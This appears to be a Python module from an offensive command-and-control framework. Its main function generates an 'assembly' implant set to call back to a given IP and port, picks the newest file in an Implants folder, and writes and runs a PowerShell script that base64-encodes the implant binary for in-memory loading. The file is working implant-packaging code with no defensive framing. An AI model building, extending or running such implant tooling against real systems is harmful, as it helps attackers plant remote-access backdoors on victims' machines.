import glob
import os
import subprocess
import sys
import time

import Services.Implant_Generation.Basic_Gen
import Utilities.constant as const


def write_powershell_script(bin_path, output_path):
    content = """
$bytes = [System.IO.File]::ReadAllBytes("%s")
$Base64 = [Convert]::ToBase64String($Bytes) > %s
""" % (bin_path, output_path)

    file = open("Resources\\tools\\Get-AssemblyCode.ps1", "w+")
    file.writelines(content)


def get_assembly_code(output_path):
    script_path = os.path.abspath("Resources\\tools\\Get-AssemblyCode.ps1")
    run_script = subprocess.Popen(["powershell.exe", script_path], stdout=sys.stdout)

    run_script.communicate()

    if len(output_path) != 0:
        const.success_message("AssemblyCode available at: " + output_path)


def latest_implant():
    try:
        list_of_files = glob.glob('Implants\\*')
        latest_file = max(list_of_files, key=os.path.getctime)
        return latest_file
    except Exception as ex:
        const.error_exception("Error:", ex)


def main(ip, port):
    Services.Implant_Generation.Basic_Gen.main("assembly", ip, port)
    time.sleep(2)

    latest_implant()
    bin_path = os.path.abspath(latest_implant())
    output_path = os.path.abspath("Implants\\ImplantAssemblyCode.txt")

    write_powershell_script(bin_path, output_path)
    get_assembly_code(output_path)
